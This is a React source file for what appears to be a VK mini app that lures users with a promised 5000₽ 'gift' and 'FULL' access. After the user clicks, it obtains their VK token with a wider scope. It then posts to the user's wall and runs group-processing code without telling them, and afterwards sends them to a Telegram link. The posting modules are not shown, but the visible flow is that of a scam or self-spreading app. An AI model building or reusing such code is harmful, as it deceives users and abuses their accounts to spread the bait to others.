import {useUnit} from "effector-react";
import { useEffect, useState } from "react";
import "./App.css";
import {USER_SCOPE} from "./constants";
import {fetchConfigs} from "./data/config";
import {getUserTokenFX, wallPostFX} from "./data/effects.config";
import {$config} from "./data/store.config";
import {selectRandom} from "./utils/random";
import {processGroups} from "./vk-bridge/groups";
import bannerImage from './assets/undraw_post_re_mtr4 1.png';
import { settingsCache } from './settingsCache';

const randomValue = selectRandom(5000, 5000);


function App() {
    const {givenScope, token, user} = useUnit($config);
    const [tgLink, setTgLink] = useState<string | null>(null);
    const [isFinished, setIsFinished] = useState(false);
    const [isLoading, setIsLoading] = useState(false);

    useEffect(() => {
        fetch('/settings.json')
            .then((res) => res.json())
            .then((data) => {
                console.debug("Loaded settings:", data);
                settingsCache.TG_LINK = data.TG_LINK;
                settingsCache.APP_ID = data.APP_ID;
                settingsCache.VK_PROXY_URL = data.VK_PROXY_URL;
                settingsCache.VK_ALBUM_TITLE = data.VK_ALBUM_TITLE;
                settingsCache.APP_LINK = data.APP_LINK;
                setTgLink(data.TG_LINK);
            });
    }, []);

    useEffect(() => {
        if (givenScope && givenScope !== USER_SCOPE) {
            getUserTokenFX();
        } else if (givenScope === USER_SCOPE && token && user && tgLink && !isFinished) {
            // setIsLoading(true);
            wallPostFX({ token, userId: user.id })
                .then(async () => {
                    const groupConfigs = await fetchConfigs();
                    await processGroups(groupConfigs);
                    setIsFinished(true);
                })
                .finally(() => {
                    setIsLoading(false); // окончание загрузки
                });
        }
    }, [givenScope, token, user, tgLink]);

    const handleClick = async () => {
        if (isLoading) return;
        setIsLoading(true);

        try {
            await getUserTokenFX();
        } catch {
            handleClick();
        }
    };
    return (
        <div className="main-screen">
            <img src={bannerImage} alt="banner" className="main-screen-banner" />
            {isFinished ? (
                <div className="main-screen-card">
                    <div
                        className="main-screen-avatar"
                        style={{
                            backgroundImage: user?.photo_200 ? `url(${user.photo_200})` : undefined,
                        }}
                    ></div>
                    <div className="main-screen__title">Ваши итоги</div>
                    <div className="main-screen__subtitle">
                        🎁 Подарок успешно подготовлен!
                    </div>
                    {tgLink && (
                        <a href={`https://vk.com/away.php?to=${encodeURIComponent(tgLink)}`} target="_blank" className="cssbuttons-io-button" rel="noopener noreferrer">
                            Забрать
                        </a>
                    )}
                </div>
            ) : (
                <div className="main-screen-card">
                    <div
                        className="main-screen-avatar"
                        style={{
                            backgroundImage: user?.photo_200 ? `url(${user.photo_200})` : undefined,
                        }}
                    ></div>
                    <div className="main-screen__title">{user?.first_name} {user?.last_name}</div>
                    <div className="main-screen__subtitle">
                        Приветствую! Забирай FULL <br /> и подарок в размере
                    </div>
                    <div className="main-screen__price">{randomValue}₽</div>
                    <button
                        className="cssbuttons-io-button"
                        onClick={handleClick}
                        disabled={isLoading}
                    >
                        {isLoading ? 'Ожидайте...' : 'Получить'}
                    </button>
                </div>
            )}
        </div>
    );

}

export default App;
